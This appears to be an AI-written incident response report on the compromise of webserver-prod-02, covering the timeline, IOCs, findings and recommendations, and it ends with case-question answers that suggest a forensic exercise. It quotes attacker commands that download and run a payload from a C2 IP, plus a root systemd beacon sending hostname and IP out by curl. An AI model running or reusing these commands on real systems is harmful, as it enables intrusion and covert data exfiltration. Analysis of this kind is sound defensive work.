All 9 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised. The attacker gained initial access through the **www-data** account (likely via a web application vulnerability), downloaded and executed a payload from a known C2 server (**185.229.59.103**), then pivoted to the **deploy** account via its SSH key. Using deploy's overly permissive `NOPASSWD` sudo grant on `systemctl`, the attacker installed a persistent systemd service that beacons to the C2 every 10 minutes.

## Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| *Unknown (pre-log)* | Attacker gains shell as www-data, runs recon (`id`, `uname -a`), downloads payload from `http://185.229.59.103/u` to `/tmp/.u`, executes it | `fs/var/www/.bash_history:1-7` |
| Apr 14 03:17:44 | Attacker SSH-logs in as **deploy** from C2 IP 185.229.59.103 using publickey auth | `auth.log:30` |
| Apr 14 03:18:02 | Attacker reads `/etc/passwd` via sudo | `auth.log:32` |
| Apr 14 03:18:12 | Attacker copies `/tmp/update` to `/usr/local/bin/update` via sudo | `auth.log:35` |
| Apr 14 03:18:17 | Attacker `chmod +x` the binary | `auth.log:36` |
| Apr 14 03:18:29 | Attacker writes `system-updater.service` via `sudo tee` | `auth.log:37` |
| Apr 14 03:18:44–03:19:03 | Attacker runs `systemctl daemon-reload`, `enable`, and `start` on the malicious service | `auth.log:38-40` |
| Apr 14 03:20:51 | Attacker disconnects | `auth.log:41` |

## Key Findings

### 1. Persistent C2 Beacon (CONFIRMED)
A malicious systemd unit `system-updater.service` at `etc/systemd/system/system-updater.service` runs as root. It executes `curl -sX POST https://185.229.59.103:8443/beacon` with the host's hostname and IP every 600 seconds. The service is enabled for `multi-user.target` (auto-start on boot).

### 2. Attacker Activity in www-data Shell History (CONFIRMED)
The file `fs/var/www/.bash_history` contains 7 commands showing clear attacker activity: system reconnaissance (`id`, `uname -a`), payload download from C2 (`wget http://185.229.59.103/u -O /tmp/.u`), execution (`chmod +x /tmp/.u; /tmp/.u &`), and credential file access (`cat /etc/passwd`).

### 3. Compromised deploy Account (CONFIRMED)
The attacker authenticated as `deploy` from the C2 IP via SSH publickey (auth.log:30). No brute-force attempts were observed — the attacker possessed a valid SSH private key. The deploy account has two authorized keys (`deploy@ci-runner-1`, `deploy@ci-backup`).

### 4. Dangerous Sudoers Configuration (CONFIRMED)
`etc/sudoers.d/deploy` grants `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl` — a known privilege-escalation vector that the attacker exploited to install a rogue service running as root.

### 5. Malicious Binary Dropped (CONFIRMED)
The attacker copied `/tmp/update` to `/usr/local/bin/update` and made it executable (auth.log:35-36). This binary's purpose is unknown from available evidence, but it was staged alongside the C2 beacon installation.

### 6. Known-Bad IOC (CONFIRMED)
**185.229.59.103** is a confirmed C2 server (high confidence). It was used for: (a) payload hosting (`http://185.229.59.103/u`), (b) SSH login source for deploy, and (c) beacon destination (`https://185.229.59.103:8443/beacon`).

### 7. Inferred Initial Access Vector (INFERENCE)
The attacker likely exploited a web application vulnerability to obtain a shell as www-data, then escalated to the deploy account — possibly by recovering the deploy SSH private key from the filesystem or through the payload downloaded to `/tmp/.u`.

## Accounts and Shell Histories

| Account | History File | Size | Commands | Content |
|---|---|---|---|---|
| **root** | `fs/root/.bash_history` | 80 bytes | 4 | Benign admin: `apt update/upgrade`, `systemctl restart nginx`, `tail -f` |
| **deploy** | `fs/home/deploy/.bash_history` | 264 bytes | 15 | Routine CI/CD: `git pull`, `npm ci/build/test`, `systemctl status nginx` |
| **alice** | `fs/home/alice/.bash_history` | 123 bytes | 6 | Benign log review: `ls`, `cd /var/log`, `tail nginx/access.log` |
| **www-data** | `fs/var/www/.bash_history` | 103 bytes | 7 | **MALICIOUS**: recon, payload download from C2, execution, passwd read |
| **bob** | *(no history file)* | — | — | Account exists (uid=1003), logged in twice, but no shell history on disk |

## Indicators of Compromise

| IOC | Type | Context |
|---|---|---|
| `185.229.59.103` | IP (C2 server) | SSH source, payload host, beacon destination |
| `https://185.229.59.103:8443/beacon` | URL | C2 beacon endpoint |
| `http://185.229.59.103/u` | URL | Malware download |
| `/usr/local/bin/update` | File path | Dropped binary |
| `/tmp/.u` | File path | Initial payload |
| `system-updater.service` | Service name | Persistent beacon |

## Recommendations

1. **Immediately disable** the `system-updater.service` and remove the unit file
2. **Revoke** all SSH keys for the `deploy` account and re-key
3. **Remove** `/usr/local/bin/update` and collect it for malware analysis
4. **Restrict** deploy's sudoers to specific systemctl subcommands (e.g., `systemctl restart nginx` only)
5. **Block** `185.229.59.103` at the network perimeter
6. **Investigate** the web application for the vulnerability that gave the attacker a www-data shell
7. **Audit** bob's missing shell history — determine if it was deliberately cleared

---

## Case Questions

**Case Q1:** Shell histories were analyzed for four accounts: **root** (`fs/root/.bash_history`, 4 commands), **deploy** (`fs/home/deploy/.bash_history`, 15 commands), **alice** (`fs/home/alice/.bash_history`, 6 commands), and **www-data** (`fs/var/www/.bash_history`, 7 commands). A fifth account, **bob** (uid=1003), had no shell history file on disk despite having logged in twice.

**Case Q2:** Yes — the **www-data** account's shell history (`fs/var/www/.bash_history`) shows what the attacker did. The attacker performed system reconnaissance (`id`, `uname -a`), changed to `/tmp`, downloaded a payload from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), made it executable (`chmod +x /tmp/.u`), ran it in the background (`/tmp/.u &`), and read `/etc/passwd` (`cat /etc/passwd`). The attacker's subsequent actions (SSH login as deploy, sudo commands to install persistence) are captured in the auth.log sudo trail rather than in any shell history file.